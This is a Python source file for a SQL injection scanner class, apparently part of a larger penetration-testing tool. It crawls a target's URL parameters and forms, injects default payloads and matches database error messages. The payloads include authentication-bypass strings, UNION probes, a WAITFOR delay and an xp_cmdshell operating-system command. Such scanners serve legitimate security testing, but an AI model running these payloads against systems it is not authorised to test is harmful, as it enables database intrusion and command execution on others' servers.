import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re

class SQLiScanner:
    def __init__(self, url, args):
        self.url = url
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies:
            self.session.cookies.update({'session': args.cookies})
        
        self.payloads = self.load_payloads()
        self.error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQLSyntaxErrorException',
            r'valid MySQL result',
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_',
            r'valid PostgreSQL result',
            r'ORA-[0-9]{5}',
            r'ORA-[0-9]{4}',
            r'SQLite/JDBCDriver',
            r'SQLite.Exception',
            r'System.Data.SQLite.SQLiteException',
            r'Warning.*sqlite_',
            r'Warning.*SQLite3::',
            r'\[SQL Server\]',
            r'Driver.* SQL Server',
            r'SQL Server.*Driver',
            r'Unclosed quotation mark',
            r'mssql_',
            r'Microsoft OLE DB Provider for ODBC Drivers'
        ]
        
        self.results = []
    
    def load_payloads(self):
        """Load SQLi payloads from file or use defaults"""
        payload_file = 'payloads/sqli.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            return [
                "'",
                "''",
                "`",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR 1=1--",
                "\" OR 1=1--",
                "1' OR '1'='1",
                "1' OR '1'='1' --",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 LIMIT 1 #",
                "'; EXEC xp_cmdshell('dir')--",
                "' WAITFOR DELAY '0:0:5'--"
            ]
    
    def detect_sqli_error(self, response_text):
        """Check if response contains SQL error messages"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def detect_time_based(self, base_time, attack_time):
        """Detect time-based SQL injection"""
        if attack_time - base_time > 4:  # More than 4 seconds delay
            return True
        return False
    
    def test_url_params(self, url, params):
        """Test URL parameters for SQL injection"""
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads:
                test_url = url.replace(f"{param}=", f"{param}={payload}")
                # Or better: construct properly
                parsed = urlparse(url)
                if parsed.query:
                    new_params = []
                    for p in parsed.query.split('&'):
                        if '=' in p:
                            key, val = p.split('=', 1)
                            if key == param:
                                new_params.append(f"{key}={payload}")
                            else:
                                new_params.append(p)
                    new_query = '&'.join(new_params)
                    test_url = url.replace(parsed.query, new_query)
                
                try:
                    response = self.session.get(test_url, timeout=self.args.timeout)
                    
                    if self.detect_sqli_error(response.text):
                        vulnerabilities.append({
                            'url': test_url[:100],
                            'payload': payload[:50],
                            'param': param,
                            'technique': 'Error-based SQLi',
                            'confidence': 'High'
                        })
                        break
                    
                except Exception:
                    continue
        
        return vulnerabilities
    
    def test_form_params(self, forms, base_url):
        """Test form parameters for SQL injection"""
        vulnerabilities = []
        
        for form in forms:
            action = form.get('action', '')
            if not action or action == '#':
                action = base_url
            else:
                action = urljoin(base_url, action)
            
            method = form.get('method', 'get').lower()
            inputs = []
            
            for input_tag in form.find_all(['input', 'textarea']):
                name = input_tag.get('name')
                if name and input_tag.get('type', 'text') not in ['submit', 'button', 'image']:
                    inputs.append(name)
            
            if not inputs:
                continue
            
            for payload in self.payloads:
                data = {}
                for inp in inputs:
                    data[inp] = payload
                
                try:
                    if method == 'post':
                        response = self.session.post(action, data=data, timeout=self.args.timeout)
                    else:
                        response = self.session.get(action, params=data, timeout=self.args.timeout)
                    
                    if self.detect_sqli_error(response.text):
                        vulnerabilities.append({
                            'url': action[:100],
                            'payload': payload[:50],
                            'param': ', '.join(inputs),
                            'technique': 'Error-based SQLi (Form)',
                            'confidence': 'High'
                        })
                        break
                except Exception:
                    continue
        
        return vulnerabilities
    
    def scan(self):
        """Main SQL injection scan"""
        print("    [*] Analyzing target for SQL injection vectors...")
        
        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
        except Exception as e:
            print(f"    [!] Error fetching target: {e}")
            return []
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        # Test URL parameters
        parsed = urlparse(self.url)
        url_params = []
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    url_params.append(param.split('=')[0])
        
        if url_params:
            print(f"    [*] Testing {len(url_params)} URL parameters...")
            self.results.extend(self.test_url_params(self.url, url_params))
        
        # Test forms
        if forms:
            print(f"    [*] Testing {len(forms)} forms...")
            self.results.extend(self.test_form_params(forms, self.url))
        
        if not url_params and not forms:
            print("    [!] No input vectors found. Cannot test SQL injection.")
        
        return self.results